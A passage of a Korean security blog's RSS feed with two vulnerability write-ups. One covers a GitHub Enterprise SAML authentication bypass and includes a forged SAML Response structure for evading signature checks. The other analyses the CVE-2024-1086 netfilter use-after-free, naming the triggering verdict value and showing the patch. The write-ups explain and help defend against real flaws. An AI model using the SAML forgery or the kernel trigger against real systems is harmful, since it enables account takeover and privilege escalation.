&#xBA54;&#xC2DC;&#xC9C0;&#xB77C;&#xBA74; &#xBCF5;&#xD638;&#xD654; &#xC218;&#xD589;</li><li><code>parse()</code> : <code>&lt;samlp:Response/saml:Assertion</code> &#xBE14;&#xB85D;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xBA70; &#xBA54;&#xC2DC;&#xC9C0; &#xC815;&#xBCF4;&#xB97C; &#xCC98;&#xB9AC;.</li></ol><p><strong>EncryptedAssertion</strong></p><p>&#xC554;&#xD638;&#xD654;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC544;&#xB798; &#xC608;&#xC2DC; SAML Response &#xC5D0;&#xC11C;  <code>saml:EncryptedAssertion</code> &#xBE14;&#xB85D; &#xC548;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;. &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xAE30;&#xC7AC;&#xB418;&#xB294; Assertion &#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xC5EC; &#xBCF4;&#xC548;&#xC131;&#xC744; &#xB354; &#xCC59;&#xAE30;&#xB824;&#xACE0; &#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><pre><code class="hljs jsx">&lt;samlp:Response ID=<span class="hljs-string">&quot;123&quot;</span>&gt;    &lt;ds:Signature&gt;        &lt;ds:SignedInfo&gt;            &lt;ds:Refernce URI=<span class="hljs-string">&quot;#123&quot;</span>&gt;&lt;/ds:Refernce&gt;        &lt;/ds:SignedInfo&gt;    &lt;/ds:Signature&gt;    &lt;saml:EncryptedAssertion&gt;            enc assertion here&lt;/saml:EncryptedAssertion&gt;&lt;/samlp:Response&gt;</code></pre><p>build &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC554;&#xD638;&#xD654;&#xB41C; Assertion &#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;, &#xBA3C;&#xC800; Signature &#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xACE0; &#xBCF5;&#xD638;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;. &#xCC98;&#xC74C; Signature &#xAC00; &#xCD94;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; (&#xAC12;&#xC774; &#xBE44;&#xC5B4;&#xC788;&#xC73C;&#xBA74;) &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xAC12;&#xC5D0;&#xC11C; Signature &#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">def self.build(xml, options = {})  <span class="hljs-keyword">if</span> GitHub.enterprise? &amp;&amp; GitHub.saml_encrypted_assertions?    signatures = message_class.signatures(doc)    decrypt_errors = []    plain_doc = message_class.decrypt(doc, options, decrypt_errors)    signatures = message_class.signatures(plain_doc) <span class="hljs-keyword">if</span> signatures.empty?  ...  endend</code></pre><p><strong>SAML Response &#xAC80;&#xC99D; &#xACFC;&#xC815;</strong></p><p>SAML Response &#xC758; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; <code>valid?</code> &#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C; &#xAC80;&#xC99D;&#xB4E4;&#xC744; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;.</p><ul><li><code>validate_has_signature</code><ul><li><code>has_root_sig_and_matching_ref?</code> &#xB610;&#xB294; <code>all_assertions_signed_with_matching_ref?</code> &#xD568;&#xC218; &#xACB0;&#xACFC;&#xAC00; &#xCC38;&#xC77C; &#xACBD;&#xC6B0; &#xD1B5;&#xACFC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><code>validate_assertion_digest_values</code>: &#xAC01; Assertion &#xC758; DigestValue (hash) &#xB97C; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>validate_signatures_ghes</code> : <code>build()</code> &#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xB41C; SignatureValue (&#xC11C;&#xBA85;) &#xC744; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p><code>validate_has_signature</code> &#xC758; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294;<code>has_root_sig_and_matching_ref?</code> &#xBA54;&#xC18C;&#xB4DC;&#xB294; Assertion &#xBE14;&#xB85D; &#xBC16;&#xC5D0; &#xC788;&#xB294; Signature &#xAC00; root (Response &#xBE14;&#xB85D;) ID&#xC640; &#xAC19;&#xC740;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p><code>all_assertion_signed_with_matching_ref?</code> &#xBA54;&#xC18C;&#xB4DC;&#xB294; &#xBAA8;&#xB4E0; Assertion &#xBE14;&#xB85D;&#xC774; Signature &#xB97C; &#xAC16;&#xB294;&#xC9C0;&#xC640; Signature URI&#xAC00; &#xBD80;&#xBAA8; Assertion ID&#xC640; &#xB9E4;&#xCE6D;&#xC774; &#xB418;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"># Validate that the SAML message (root XML element of SAML response)# or all contained assertions are signed## Verification of signatures is done in #validate_signaturesdef validate_has_signature  # Return early if entire response is signed. This prevents individual  # assertions from being tampered because any change in the response  # would invalidate the entire response.  <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> has_root_sig_and_matching_ref?  <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> all_assertions_signed_with_matching_ref?  self.errors &lt;&lt; <span class="hljs-string">&quot;SAML Response is not signed or has been modified.&quot;</span>enddef has_root_sig_and_matching_ref?  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">if</span> SAML.mocked[:mock_root_sig]  root_ref = <span class="hljs-built_in">document</span>.at(<span class="hljs-string">&quot;/saml2p:Response/ds:Signature/ds:SignedInfo/ds:Reference&quot;</span>, namespaces)  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> unless root_ref  root_ref_uri = String(String(root_ref[&quot;URI&quot;])[1..-1]) # chop off leading #  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> unless root_ref_uri.length &gt; <span class="hljs-number">1</span>  root_rep = <span class="hljs-built_in">document</span>.at(<span class="hljs-string">&quot;/saml2p:Response&quot;</span>, namespaces)  root_id = <span class="hljs-built_in">String</span>(root_rep[<span class="hljs-string">&quot;ID&quot;</span>])  # and finally does the root ref URI match the root ID?  root_ref_uri == root_idenddef all_assertions_signed_with_matching_ref?  assertions = <span class="hljs-built_in">document</span>.xpath(<span class="hljs-string">&quot;//saml2:Assertion&quot;</span>, namespaces)  assertions.all? <span class="hljs-keyword">do</span> |assertion|    ref = assertion.at(<span class="hljs-string">&quot;./ds:Signature/ds:SignedInfo/ds:Reference&quot;</span>, namespaces)    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> unless ref    assertion_id = <span class="hljs-built_in">String</span>(assertion[<span class="hljs-string">&quot;ID&quot;</span>])    ref_uri = String(String(ref[&quot;URI&quot;])[1..-1]) # chop off leading #    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> unless ref_uri.length &gt; <span class="hljs-number">1</span>    ref_uri == assertion_id  endend</code></pre><p>&#xC870;&#xAE08; &#xBCF5;&#xC7A1;&#xD558;&#xC9C0;&#xB9CC; &#xCC9C;&#xCC9C;&#xD788; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; &#xC608;&#xC2DC; SAML Response &#xC785;&#xB2C8;&#xB2E4;. <code>has_root_sig_and_matching_ref?</code> &#xC740; [1] &#xC758; Signature &#xBE14;&#xB85D;&#xB0B4;&#xC5D0; Reference URI &#xAC00; Response ID &#xC640; &#xAC19;&#xC740;&#xC9C0; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xB294; &#xC5ED;&#xD560;&#xC774;&#xAD6C;&#xC694;. <code>all_assertion_signed_with_matching_ref?</code> &#xB294; [2] &#xC640; &#xAC19;&#xC740; Assertion &#xBE14;&#xB85D;&#xB4E4;&#xC774; Signature &#xB97C; &#xAC16;&#xACE0; Reference URI &#xAC00; &#xD574;&#xB2F9; Assertion ID&#xC640; &#xB9E4;&#xCE6D;&#xC774; &#xB418;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xBA54;&#xC11C;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>validate_assertion_digest_values</code> &#xC640; <code>validate_signatures_ghes</code> &#xB294; &#xAC01; Assertion &#xBE14;&#xB85D;&#xC758; DigestValue &#xB97C; &#xB808;&#xD37C;&#xB7F0;&#xC2A4; &#xB418;&#xB294; &#xB178;&#xB4DC;&#xC758; Signature &#xC640; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;. Assertion [2] &#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><pre><code class="hljs jsx">&lt;Response ID=<span class="hljs-string">&quot;123&quot;</span>&gt;    &lt;Signature&gt; <span class="hljs-comment">// [1]</span>        &lt;SignedInfo&gt;            &lt;Refernce URI=<span class="hljs-string">&quot;#123&quot;</span>&gt;&lt;/Refernce&gt;        &lt;/SignedInfo&gt;    &lt;/Signature&gt;    &lt;Assertion ID=<span class="hljs-string">&quot;789&quot;</span>&gt;        &lt;Signature&gt; <span class="hljs-comment">// [2]</span>            &lt;SignedInfo&gt;                &lt;Refernce URI=<span class="hljs-string">&quot;#789&quot;</span>&gt;&lt;/Refernce&gt;            &lt;/SignedInfo&gt;        &lt;/Signature&gt;    &lt;/Assertion&gt;&lt;/Response&gt;</code></pre><p><strong>&#xAC80;&#xC99D; &#xC6B0;&#xD68C;</strong></p><p>Signature &#xC640; Assertion &#xC30D;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; <code>validate_has_signature</code> &#xC6B0;&#xD68C;&#xB97C; &#xC704;&#xD574; <code>&lt;ds:Object&gt;</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Root Response &#xC758; ID&#xB97C; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xACE0; Object &#xBE14;&#xB85D; &#xC548;&#xC5D0; &#xC6D0;&#xBCF8; Response &#xB97C; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xCD5C;&#xC0C1;&#xC704; Signature &#xC758; Refrence URI &#xB294; &#xC0BD;&#xC785;&#xB41C; Response &#xC758; ID&#xB85C; &#xB9DE;&#xCDA5;&#xB2C8;&#xB2E4;. [1] &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xC0BD;&#xC785;&#xB41C; Response &#xC544;&#xB798;&#xC758; Assertion &#xACFC; &#xADF8; &#xB2E4;&#xC74C; Signature &#xC758; ID, URI &#xB97C; &#xB9DE;&#xCDA5;&#xB2C8;&#xB2E4;. [2]</p><pre><code class="hljs jsx">&lt;Response ID=<span class="hljs-string">&quot;11111111&quot;</span>&gt;  &lt;Signature&gt;    &lt;SignedInfo&gt;      &lt;Refernce URI=<span class="hljs-string">&quot;#123&quot;</span>&gt;&lt;/Refernce&gt; [<span class="hljs-number">1</span>]    &lt;/SignedInfo&gt;    &lt;<span class="hljs-built_in">Object</span>&gt;      &lt;Response ID=<span class="hljs-string">&quot;123&quot;</span>&gt; [<span class="hljs-number">1</span>]        &lt;Signature&gt;          &lt;SignedInfo&gt;            &lt;Refernce URI=<span class="hljs-string">&quot;#123&quot;</span>&gt;&lt;/Refernce&gt;          &lt;/SignedInfo&gt;        &lt;/Signature&gt;        &lt;Assertion ID=<span class="hljs-string">&quot;789&quot;</span>&gt; [<span class="hljs-number">2</span>]          &lt;Signature&gt;            &lt;SignedInfo&gt;              &lt;Refernce URI=<span class="hljs-string">&quot;#789&quot;</span>&gt;&lt;/Refernce&gt; [<span class="hljs-number">2</span>]            &lt;/SignedInfo&gt;          &lt;/Signature&gt;        &lt;/Assertion&gt;      &lt;/Response&gt;    &lt;/<span class="hljs-built_in">Object</span>&gt;  &lt;/Signature&gt;---- THIS WILL BE ENCRYPTED ----  &lt;Assertion ID=<span class="hljs-string">&quot;789&quot;</span>&gt; [<span class="hljs-number">3</span>]    &lt;Signature&gt;      &lt;SignedInfo&gt;        &lt;Refernce URI=<span class="hljs-string">&quot;#789&quot;</span>&gt;&lt;/Refernce&gt; [<span class="hljs-number">3</span>]      &lt;/SignedInfo&gt;    &lt;/Signature&gt;  &lt;/Assertion&gt;---- THIS WILL BE ENCRYPTED ----&lt;/Response&gt;</code></pre><p>[1] &#xC740; &#xC6D0;&#xBCF8; Response &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xB294; DigestValue &#xC640; &#xC11C;&#xBA85;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>[3] &#xC740; &#xBCC0;&#xC870;&#xB41C; Assertion &#xC744; &#xAD6C;&#xC131;&#xD574;&#xC11C; GitHub Enterprise &#xC758; &#xACF5;&#xAC1C;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654;&#xD558;&#xC5EC; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBCC0;&#xC870;&#xB41C; SAML Response &#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC554;&#xD638;&#xD654;&#xB41C; Assertion &#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC;  <code>.valid?</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xB4F1;&#xC7A5;&#xD558;&#xB294; Reference URI &#xC758; Signature &#xB97C; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, [1] &#xC774; &#xAC80;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xC774; &#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p>&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass">https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/account-takeover/">account takeover</category>
      
      <category domain="https://hackyboiz.github.io/tags/SAML/">SAML</category>
      
      <category domain="https://hackyboiz.github.io/tags/GitHub/">GitHub</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/15/mungsul/2025-03-15/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-1086: Linux Kernel 내 Use-After-Free</title>
      <link>https://hackyboiz.github.io/2025/03/12/romi0x/1day1line0312/</link>
      <guid>https://hackyboiz.github.io/2025/03/12/romi0x/1day1line0312/</guid>
      <pubDate>Wed, 12 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.igloo.co.kr/security-information/linux-kernel</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.igloo.co.kr/security-information/linux-kernel-%eb%82%b4-use-after-free-%ec%b7%a8%ec%95%bd%ec%a0%90cve-2024-1086-%eb%b6%84%ec%84%9d-%eb%b0%8f-%eb%8c%80%ec%9d%91%eb%b0%a9%ec%95%88/">https://www.igloo.co.kr/security-information/linux-kernel-%eb%82%b4-use-after-free-%ec%b7%a8%ec%95%bd%ec%a0%90cve-2024-1086-%eb%b6%84%ec%84%9d-%eb%b0%8f-%eb%8c%80%ec%9d%91%eb%b0%a9%ec%95%88/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux Kernel 6.1 ~ 6.5 &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Linux Kernal &#xB0B4; &#xB9AC;&#xB205;&#xC2A4; &#xD328;&#xD0B7; &#xD544;&#xD130;&#xB9C1; &#xBC0F; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC8FC;&#xC18C; &#xBCC0;&#xD658;(NAT) &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; netfilter&#xC758; nf_tables &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0;&#xC11C; UAF&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; nftables&#xC758; &#xD328;&#xD0B7; &#xCC98;&#xB9AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;,  <code>nf_hook_slow()</code>&#xC640; <code>nft_verdict_init()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; <code>nf_hook_slow()</code> &#xD568;&#xC218;&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">int</span> nf_hook_slow(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> nf_hook_state *state,                  <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> nf_hook_entries *e, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> s){    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> verdict;    <span class="hljs-keyword">int</span> ret;    <span class="hljs-keyword">for</span> (; s &lt; e-&gt;num_hook_entries; s++) {        verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);                <span class="hljs-keyword">switch</span> (verdict &amp; NF_VERDICT_MASK) {            <span class="hljs-keyword">case</span> NF_ACCEPT:                <span class="hljs-keyword">break</span>;            <span class="hljs-keyword">case</span> NF_DROP:                kfree_skb(skb);                ret = NF_DROP_GETERR(verdict);                <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>)  <span class="hljs-comment">// &#xC624;&#xD0C0; &#xC218;&#xC815;</span>                    ret = -EPERM;                <span class="hljs-keyword">return</span> ret;            <span class="hljs-keyword">case</span> NF_QUEUE:                ret = nf_queue(skb, state, s, verdict);                <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">1</span>)                    <span class="hljs-keyword">continue</span>;                <span class="hljs-keyword">return</span> ret;            <span class="hljs-keyword">default</span>:                <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; netfilter &#xBAA8;&#xB4C8; &#xB0B4;&#xC758; <code>nf_hook_slow()</code> &#xD568;&#xC218;&#xC758; &#xC77C;&#xBD80;&#xB85C;, &#xD328;&#xD0B7; &#xCC98;&#xB9AC; &#xADDC;&#xCE59;&#xC744; &#xBC18;&#xBCF5;&#xBB38; &#xC548;&#xC5D0;&#xC11C; &#xD3C9;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xD328;&#xD0B7;&#xC5D0; &#xB300;&#xD55C; verdict &#xAC12;&#xC744; &#xC5BB;&#xACE0;, &#xADF8; &#xAC12;&#xACFC; NF_VERDICT_MASK &#xB9E4;&#xD06C;&#xB85C; &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD328;&#xD0B7; &#xCC98;&#xB9AC;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. verdict &#xAC12;&#xC740; &#xD328;&#xD0B7; &#xCC98;&#xB9AC; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;, &#xC774;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>nf_hook_slow()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; NF_DROP&#xC77C; &#xACBD;&#xC6B0; <code>kfree_skb()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD328;&#xD0B7;&#xC744; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; NF_DROP_GETERR(verdict)&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC124;&#xC815;&#xD55C; verdict &#xAC12;&#xC774; &#x201C;0xFFFF0000&#x201D;&#xC774;&#xB77C;&#xBA74;, &#xD568;&#xC218; &#xB0B4;&#xBD80; &#xC5F0;&#xC0B0;&#xC744; &#xD1B5;&#xD574; ret &#xAC12;&#xC740; -65535&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; &#xC774;&#xD6C4; NF_ACCEPT&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xC5B4; &#xD328;&#xD0B7;&#xC774; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xB294; <code>nft_verdict_init()</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">nft_verdict_init</span>(<span class="hljs-params"><span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx, <span class="hljs-keyword">struct</span> nft_data *data, <span class="hljs-keyword">struct</span> nft_data_desc *desc, <span class="hljs-keyword">const</span> struct_nlattr *nla</span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">switch</span> (data-&gt;verdict.code) {    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">switch</span> (data-&gt;verdict.code &amp; NF_VERDICT_MASK) {        <span class="hljs-keyword">case</span> NF_ACCEPT:        <span class="hljs-keyword">case</span> NF_DROP:        <span class="hljs-keyword">case</span> NF_QUEUE:            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:            <span class="hljs-keyword">return</span> -EINVAL;        }    }    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>nft_verdict_init()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>data-&gt;verdict.code</code>&#xB294; &#xADDC;&#xCE59; &#xC124;&#xC815;&#xC5D0; &#xB300;&#xD55C; &#xB9AC;&#xD134; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#x201C;0xFFFF0000&#x201D; &#xAC12;&#xC744; &#xC124;&#xC815;&#xD560; &#xACBD;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>NF_VERDICT_MASK &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xD1B5;&#xD574; verdict.code&#xC758; &#xD558;&#xC704; 16&#xBE44;&#xD2B8;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xBA74;, &#x201C;0xFFFF0000 &amp; 0x0000FFFF&#x201D;&#xAC00; &#xB418;&#xC5B4; &#x201C;0x00000000&#x201D;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; NF_DROP&#xC744; &#xC758;&#xBBF8;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xD328;&#xD0B7;&#xC744; &#xB4DC;&#xB86D;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>nf_hook_slow()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD328;&#xD0B7;&#xC744; &#xB4DC;&#xB86D;&#xD558;&#xB824;&#xB294; &#xCC98;&#xB9AC; &#xD6C4;, NF_DROP_GETERR(verdict) &#xC5F0;&#xC0B0;&#xC5D0; &#xC758;&#xD574; ret &#xAC12;&#xC740; -65535&#xB85C; &#xC124;&#xC815;&#xB418;&#xBA70;, NF_ACCEPT&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xC774;&#xBBF8; <code>kfree_skb()</code>&#xB85C; &#xD574;&#xC81C;&#xB41C; &#xD328;&#xD0B7;&#xC774; &#xB2E4;&#xC2DC; &#xCC98;&#xB9AC;&#xB418;&#xC5B4; &#xC774;&#xC804;&#xC5D0; &#xD574;&#xC81C;&#xB41C; &#xC18C;&#xCF13; &#xBA54;&#xBAA8;&#xB9AC;(skb)&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB418;&#xC5B4; Use-After-Free(UAF) &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xACE0;, &#xADF8; &#xD6C4; &#xB2E4;&#xC2DC; &#xC18C;&#xCF13; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xBA74;&#xC11C; &#xC774;&#xC911; &#xD574;&#xC81C;(double-free)&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xCE58;&#xB41C; <code>nft_verdict_init()</code> &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs groovy"><span class="hljs-keyword">switch</span> (data-&gt;verdict.code) {  <span class="hljs-keyword">case</span> <span class="hljs-attr">NF_ACCEPT:</span>  <span class="hljs-keyword">case</span> <span class="hljs-attr">NF_DROP:</span>  <span class="hljs-keyword">case</span> <span class="hljs-attr">NF_QUEUE:</span>     <span class="hljs-keyword">break</span>;  <span class="hljs-keyword">case</span> <span class="hljs-attr">NFT_CONTINUE:</span>   <span class="hljs-keyword">case</span> NFT <span class="hljs-attr">BREAK:</span>  <span class="hljs-keyword">case</span> <span class="hljs-attr">NFT_RETURN:</span>     data-&gt;verdict.chain-chain;     <span class="hljs-keyword">break</span>;  <span class="hljs-symbol">default:</span>     <span class="hljs-keyword">return</span> -EINVAL;  }</code></pre><p><code>data-&gt;verdict.code</code> &#xAC12;&#xC5D0; &#xB300;&#xD574; &#xAC80;&#xC99D;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; <code>verdict.code</code> &#xAC12;&#xC740; &#xD5C8;&#xC6A9;&#xB41C; &#xAC12;&#xB4E4;&#xB9CC; &#xCC98;&#xB9AC;&#xD558;&#xACE0;, &#xC798;&#xBABB;&#xB41C; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xC624;&#xBA74; &#xBB34;&#xC870;&#xAC74; <code>-EINVAL</code>&#xC744; &#xBC18;&#xD658;&#xD558;&#xC5EC; &#xC545;&#xC758;&#xC801;&#xC778; &#xC785;&#xB825;&#xC744; &#xCC28;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xD328;&#xD0B7; &#xCC98;&#xB9AC;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xBA70;, &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; 